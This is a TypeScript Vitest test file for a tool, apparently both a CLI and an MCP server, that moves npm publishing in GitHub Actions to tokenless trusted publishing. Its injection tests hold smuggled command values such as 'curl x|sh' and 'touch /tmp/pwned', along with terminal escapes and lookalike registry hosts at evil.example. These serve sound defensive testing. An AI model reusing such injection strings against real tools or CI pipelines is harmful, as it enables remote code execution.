import { spawn } from 'node:child_process';
import { describe, expect, it } from 'vitest';
import { CLI, makeRepo, pkg, plan, read, run } from './helpers.ts';

const PKG = pkg({ name: 'pkg-a', version: '1.0.0', repository: { type: 'git', url: 'git+https://github.com/acme/widgets.git' } });
const job = (on: string, steps: string, extra = '') => `on: ${on}
${extra}jobs:
  rel:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v6
        with:
          node-version: 24
          registry-url: https://registry.npmjs.org
${steps}`;
const TOKEN_PUBLISH = '      - run: npm ci\n      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n';

describe('untrusted triggers (fork PRs, comments)', () => {
  for (const on of ['pull_request_target', '[issue_comment]', 'workflow_run']) {
    it(`blocks publishing jobs on ${on} and changes nothing`, () => {
      const wf = job(on, TOKEN_PUBLISH);
      const root = makeRepo({ '.github/workflows/ci.yml': wf, 'package.json': PKG });
      const p = plan(root, '--read-token', 'NPM_READ_TOKEN');
      expect(p.code).toBe(1);
      expect(p.plan.findings.find((f: any) => f.level === 'error').code).toBe('untrusted-trigger');
      expect(p.plan.trust).toEqual([]);
      run(root, 'apply', '--read-token', 'NPM_READ_TOKEN');
      expect(read(root, '.github/workflows/ci.yml')).toBe(wf);
    });
  }

  it('ignores dry runs: no id-token, no trust command', () => {
    const root = makeRepo({ '.github/workflows/ci.yml': job('pull_request', '      - run: npm publish --dry-run\n'), 'package.json': PKG });
    const p = plan(root).plan;
    expect(p.status).toBe('no-publish-workflow');
    expect(p.trust).toEqual([]);
  });
});

describe('permissions', () => {
  it('keeps workflow-level read-all read-only', () => {
    const steps = '      - run: npx semantic-release\n        env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n';
    const root = makeRepo({ '.github/workflows/r.yml': job('push', steps, 'permissions: read-all\n'), 'package.json': PKG });
    run(root, 'apply');
    const wf = read(root, '.github/workflows/r.yml');
    expect(wf).toContain('      contents: read\n');
    expect(wf).toContain('      id-token: write\n');
    expect(wf.match(/: write$/gm)).toEqual([': write']); // only id-token
  });

  it('rewrites job-level read-all without widening it', () => {
    const wf = job('push', '      - run: npm publish\n').replace('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    permissions: read-all\n');
    const root = makeRepo({ '.github/workflows/r.yml': wf, 'package.json': PKG });
    run(root, 'apply');
    expect(read(root, '.github/workflows/r.yml')).toMatch(/permissions: \{ actions: read, .*contents: read, .*id-token: write \}/);
    expect(plan(root).plan.status).toBe('already-tokenless');
  });
});

describe('token detection', () => {
  const withId = (steps: string) => job('push', steps).replace('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write\n');
  it.each([
    ['bracket syntax', "      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets['NPM_TOKEN'] }}\n"],
    ['format()', "      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: ${{ format('{0}', secrets.NPM_TOKEN) }}\n"],
    ['YARN_NPM_AUTH_TOKEN', '      - run: yarn npm publish\n        env:\n          YARN_NPM_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n'],
    ['a script step that gets the token', '      - run: ./scripts/write-npmrc.sh\n        env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n      - run: npm publish\n'],
  ])('never says already-tokenless with %s', (_name, steps) => {
    const p = plan(makeRepo({ '.github/workflows/r.yml': withId(steps), 'package.json': PKG })).plan;
    expect(p.status).not.toBe('already-tokenless');
    expect(p.nextSteps.join('\n')).toContain('gh secret delete NPM_TOKEN');
  });
});

describe('injection and lookalikes', () => {
  it('quotes repo-controlled values in trust commands and rejects bad package names', () => {
    const wf = job('push', '      - run: npm publish\n').replace('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    environment: "npm; touch /tmp/pwned"\n');
    const root = makeRepo({ '.github/workflows/r.yml': wf, 'package.json': PKG });
    expect(plan(root).plan.trust[0].command).toBe("npm trust github pkg-a --repo acme/widgets --file r.yml --env 'npm; touch /tmp/pwned' --allow-publish --yes");
    const bad = makeRepo({ '.github/workflows/r.yml': job('push', '      - run: npm publish\n'), 'package.json': pkg({ name: 'pkg-a;curl x|sh;#', version: '1.0.0' }) });
    const p = plan(bad).plan;
    expect(p.trust).toEqual([]);
    expect(p.findings.map((f: any) => f.code)).toContain('invalid-package-name');
  });

  it('strips terminal control characters from text output', () => {
    const root = makeRepo({ '.github/workflows/r.yml': job('push', '      - run: npm publish\n'), 'package.json': pkg({ name: 'x\u001b[2K\rfake', version: '1.0.0' }) });
    expect(run(root).stdout).not.toMatch(/[\u001b\r]/);
  });

  it('treats lookalike registry hosts as another registry', () => {
    for (const host of ['https://registry.npmjs.org.evil.example', 'https://registry.npmjs.org@evil.example']) {
      const root = makeRepo({ '.github/workflows/r.yml': job('push', '      - run: npm publish\n').replace('https://registry.npmjs.org', host), 'package.json': PKG });
      expect(plan(root).plan.findings.map((f: any) => f.code)).toEqual(['other-registry']);
    }
  });

  it('flags --read-token that names the current publish secret', () => {
    const root = makeRepo({ '.github/workflows/r.yml': job('push', TOKEN_PUBLISH), 'package.json': PKG });
    const p = plan(root, '--read-token', 'NPM_TOKEN').plan;
    expect(p.findings.map((f: any) => f.code)).toContain('read-token-is-publish-token');
    expect(p.nextSteps.join('\n')).toContain('revoke the old token');
  });

  it('pins an inserted setup-node to a SHA when the job pins its actions', () => {
    const wf = 'on: push\njobs:\n  rel:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - run: npm publish\n';
    const root = makeRepo({ '.github/workflows/r.yml': wf, 'package.json': PKG });
    run(root, 'apply');
    expect(read(root, '.github/workflows/r.yml')).toContain('uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0');
  });

  it('MCP rejects a malformed repo and writes nothing', async () => {
    const root = makeRepo({ '.github/workflows/r.yml': job('push', '      - run: npm publish\n'), 'package.json': PKG });
    const child = spawn(process.execPath, [CLI, 'mcp'], { stdio: ['pipe', 'pipe', 'pipe'] });
    const out: any[] = [];
    let buf = '';
    child.stdout.on('data', (d) => {
      buf += d;
      for (let i; (i = buf.indexOf('\n')) >= 0; buf = buf.slice(i + 1)) if (buf.slice(0, i).trim()) out.push(JSON.parse(buf.slice(0, i)));
    });
    const send = (m: object) => child.stdin.write(`${JSON.stringify({ jsonrpc: '2.0', ...m })}\n`);
    send({ id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '1' } } });
    send({ method: 'notifications/initialized' });
    send({ id: 2, method: 'tools/call', params: { name: 'apply_trusted_publishing', arguments: { path: root, offline: true, repo: 'o/r"; curl x|sh; echo "' } } });
    for (let i = 0; i < 50 && !out.some((m) => m.id === 2); i++) await new Promise((r) => setTimeout(r, 100));
    child.kill();
    expect(JSON.stringify(out.find((m) => m.id === 2))).toMatch(/owner\/repo/);
    expect(read(root, 'package.json')).toBe(PKG);
  });
});

describe('output', () => {
  it('shows CRLF diffs without replacement characters', () => {
    const wf = 'on: push\r\njobs:\r\n  rel:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - run: npm publish\r\n        env:\r\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\r\n';
    const out = run(makeRepo({ '.github/workflows/r.yml': wf, 'package.json': PKG })).stdout;
    expect(out).toContain('-          NODE_AUTH_TOKEN');
    expect(out).not.toContain('?\n');
  });
});
